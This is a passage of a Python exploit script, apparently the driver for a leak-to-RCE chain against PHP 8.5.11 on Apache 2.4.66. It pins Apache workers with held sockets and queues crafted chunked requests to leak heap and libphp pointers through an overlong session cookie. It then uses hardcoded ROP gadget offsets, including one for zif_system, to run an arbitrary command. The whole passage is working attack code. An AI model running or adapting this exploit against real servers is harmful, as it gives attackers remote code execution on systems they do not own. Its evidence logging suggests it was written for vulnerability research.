                    help="controlled block offset after A1/B1 history")
    ap.add_argument("--rce-headers", type=int, default=402500)
    ap.add_argument("--pivot-offset", type=lambda x: int(x, 0),
                    default=0x6362AE)
    ap.add_argument("--pop-rdi-offset", type=lambda x: int(x, 0),
                    default=0x280D8D)
    ap.add_argument("--pop-rsi-offset", type=lambda x: int(x, 0),
                    default=0x2CBE07)
    ap.add_argument("--ret-offset", type=lambda x: int(x, 0),
                    default=0x280D8E)
    ap.add_argument("--zif-system-offset", type=lambda x: int(x, 0),
                    default=0x598650)
    args = ap.parse_args()
    if not args.path.startswith("/"):
        args.path = "/" + args.path
    TARGET_PATH = args.path
    evidence = args.evidence_dir
    evidence.mkdir(parents=True, exist_ok=True)
    print(f"[*] evidence directory={evidence}")

    holders: list[Holder] = []
    holder_stop = threading.Event()
    holder_thread = threading.Thread(
        target=keep_holders_alive, args=(holders, holder_stop), daemon=True)
    holder_thread.start()
    try:
        # Over a VPN, opening 150 sockets can exceed mod_reqtimeout's initial
        # body window.  Start the keeper first so early holders survive while
        # later connections are still being established.
        effective_workers = discover_worker_pool(
            args.host, args.port, holders, 512, 5.0, 2)
        scrub_worker_pool(holders, args.host, args.port, args.path, 30.0)
        hold_workers_parallel(args.host, args.port, effective_workers, holders)
        print(f"[+] repinned scrubbed pool={effective_workers}", flush=True)
        queued_release_index = len(holders) - 1
        print(f"[*] pinned {len(holders)}/{effective_workers} workers")

        with tempfile.TemporaryDirectory(prefix="ninebie-8511-") as tmp_s:
            tmp = Path(tmp_s)
            a1 = tmp / "a1.bin"
            build_a1_body(a1, args)
            a1_response = tmp / "a1.resp"
            b1 = tmp / "b1.bin"
            build_leak_body(b1, args)
            b1_response = tmp / "b1.resp"

            # Queue B1 while A1 owns the only unpinned worker.  Waiting for
            # A1's response before connecting B1 leaves a small accept() race
            # in which a newly forked child can consume B1 and lose PS(id).
            # Two clean cycles force a residual retirement-marked child to
            # exit, then bind the surviving/fresh replacement while N-1 other
            # workers remain pinned.
            old_holder = holders.pop(queued_release_index)
            rebound = None
            for rebind_attempt in range(1, 3):
                old_port = old_holder.getsockname()[1]
                try:
                    cleanly_release_holder(
                        old_holder, args.host, args.port, args.path, 15.0)
                except (OSError, RuntimeError) as exc:
                    close_holder(old_holder)
                    print(f"[*] clean rebind probe closed early: {exc}")
                started = time.monotonic()
                rebound = open_accepted_holder(args.host, args.port, 30.0)
                print(f"[*] rebind attempt={rebind_attempt} old_port={old_port} "
                      f"new_port={rebound.getsockname()[1]} "
                      f"elapsed={time.monotonic() - started:.3f}s")
                if rebind_attempt == 1:
                    old_holder = rebound
            assert rebound is not None
            holders.append(rebound)
            queued_release_index = len(holders) - 1
            if args.pause_after_rebind:
                print(f"[*] pausing {args.pause_after_rebind:g}s after rebind")
                time.sleep(args.pause_after_rebind)

            a1_process = start_chunked(
                args.host, args.port, args.path + args.query, a1,
                a1_response, 180.0)
            # Queue both connections before releasing the lane.  FIFO ordering
            # keeps B1 behind A1 even when A1 reaches OOM immediately.
            time.sleep(0.25)
            b1_process = start_chunked(
                args.host, args.port, args.path, b1, b1_response,
                args.timeout)
            time.sleep(0.05)
            released = holders.pop(queued_release_index)
            local_port = released.getsockname()[1]
            close_holder(released)
            print(f"[*] released rebound holder client_port={local_port} "
                  "into queued A1/B1")
            finish_chunked(a1_process, a1_response, 200.0)
            print(f"[*] A1 response={a1_response.stat().st_size}")
            (evidence / "a1-response.raw").write_bytes(a1_response.read_bytes())
            response = finish_chunked(b1_process, b1_response,
                                      args.timeout + 30.0)
            (evidence / "b1-response.raw").write_bytes(response)

            encoded = cookie_value(response)
            if encoded:
                (evidence / "b1-cookie.txt").write_bytes(encoded)
            print(f"[*] B1 response={len(response)} encoded_cookie={len(encoded)}")
            if not encoded:
                reason = "no Set-Cookie PHPSESSID value"
                (evidence / "rejected-leak.json").write_text(json.dumps({
                    "status": "REJECTED", "ready_for_next_stage": False,
                    "reason": reason}, indent=2) + "\n")
                print(f"[-] {reason}")
                return 1

            result = summarize_cookie(encoded, args.pointer_floor)
            decoded = result["decoded"]
            pointers = result["pointers"]
            (evidence / "b1-cookie.bin").write_bytes(decoded)
            print(f"[*] decoded_cookie={len(decoded)} candidates={len(pointers)}")
            for value, count in result["top"]:
                print(f"    {value:#014x} count={count}")

            report = {
                "status": "REJECTED",
                "ready_for_next_stage": False,
                "profile": "PHP 8.5.11 / Apache 2.4.66 Ubuntu / x86-64 / 128M",
                "decoded_cookie_length": len(decoded),
                "pointer_candidate_values": len(pointers),
                "top_pointers": [
                    {"pointer": hex(value), "count": count}
                    for value, count in result["top"]
                ],
            }
            if len(decoded) <= 256:
                report["reason"] = "normal-sized cookie; A1/B1 stale-state disclosure did not occur"
                (evidence / "rejected-leak.json").write_text(
                    json.dumps(report, indent=2) + "\n")
                print(f"[-] {report['reason']}: {decoded!r}")
                return 2
            if not pointers:
                report["reason"] = "overlong cookie contained no pointer candidates"
                (evidence / "rejected-leak.json").write_text(
                    json.dumps(report, indent=2) + "\n")
                print(f"[-] {report['reason']}")
                return 3

            dominant, count = pointers.most_common(1)[0]
            libphp = dominant - args.zval_ptr_dtor_offset
            buckets = Counter()
            for value, value_count in pointers.items():
                buckets[value & ~0x1FFFFF] += value_count
            heap = libphp + args.heap_from_lib_delta
            heap_count = buckets.get(heap, 0)
            report.update({
                "dominant_pointer": hex(dominant),
                "dominant_count": count,
                "zval_ptr_dtor_offset": hex(args.zval_ptr_dtor_offset),
                "libphp_base": hex(libphp),
                "heap_delta": hex(args.heap_from_lib_delta),
                "heap_base": hex(heap),
                "heap_pointer_count": heap_count,
                "top_buckets": [
                    {"base": hex(base), "count": bucket_count}
                    for base, bucket_count in buckets.most_common(8)
                ],
            })
            print(f"[+] dominant={dominant:#x} count={count} "
                  f"libphp_candidate={libphp:#x}")
            print("[+] 2MiB pointer buckets: " + repr([
                (hex(base), bucket_count)
                for base, bucket_count in buckets.most_common(8)
            ]))
            print("[+] overlong Set-Cookie disclosure reproduced")

            if count < 100 or libphp & 0x1FFFFF:
                report["reason"] = (
                    "dominant pointer failed repetition or exact-build "
                    "2MiB libphp-base alignment checks")
                (evidence / "rejected-leak.json").write_text(
                    json.dumps(report, indent=2) + "\n")
                print(f"[-] {report['reason']}")
                return 4
            if heap_count == 0:
                report["reason"] = "derived main chunk is absent from leaked pointer buckets"
                (evidence / "rejected-leak.json").write_text(
                    json.dumps(report, indent=2) + "\n")
                print(f"[-] {report['reason']}")
                return 5

            report["status"] = "VALIDATED"
            report["ready_for_next_stage"] = True
            report["reason"] = None
            (evidence / "validated-leak.json").write_text(
                json.dumps(report, indent=2) + "\n")
            stale_rejection = evidence / "rejected-leak.json"
            if stale_rejection.exists():
                stale_rejection.unlink()
            print(f"[+] derived main_chunk={heap:#x} "
                  f"(libphp+{args.heap_from_lib_delta:#x}) "
                  f"bucket_count={heap_count}")
            print(f"[+] VALIDATED leak; evidence={evidence / 'validated-leak.json'}")
            if args.rce is None:
                print("[+] no --rce supplied; stopping after the fresh validated leak")
                return 0

            print("[*] consuming the fresh leak from this invocation; no saved addresses reused")
            sys.stdout.flush()
            if args.pause_before_rce:
                print(f"[*] pausing {args.pause_before_rce:g}s before RCE",
                      flush=True)
                time.sleep(args.pause_before_rce)
            time.sleep(0.2)
            proof_url = (DEFAULT_RCE_PROOF_URL
                         if args.rce == DEFAULT_RCE_COMMAND else None)
            rce_verified = amplified_rce(
                args, heap, libphp, args.rce, proof_url)
            outcome = {
                "fresh_leak_consumed": True,
                "libphp_base": hex(libphp),
                "heap_base": hex(heap),
                "command": args.rce,
                "proof_url": proof_url,
                "execution_verified": rce_verified is True,
                "status": ("VERIFIED" if rce_verified is True else
                           "DELIVERED_UNVERIFIED" if rce_verified is None else "FAILED"),
            }
            (evidence / "rce-result.json").write_text(
                json.dumps(outcome, indent=2) + "\n")
            if rce_verified is False:
                print("[-] composed leak-to-RCE stage failed")
                return 6
            if rce_verified:
                print("[+] composed leak-to-RCE chain succeeded")
            else:
                print("[?] composed leak-to-RCE payload delivered; execution unverified")
            return 0
    finally:
        holder_stop.set()
        holder_thread.join(timeout=2)
        for sock in holders:
            try:
                sock.close()
            except OSError:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
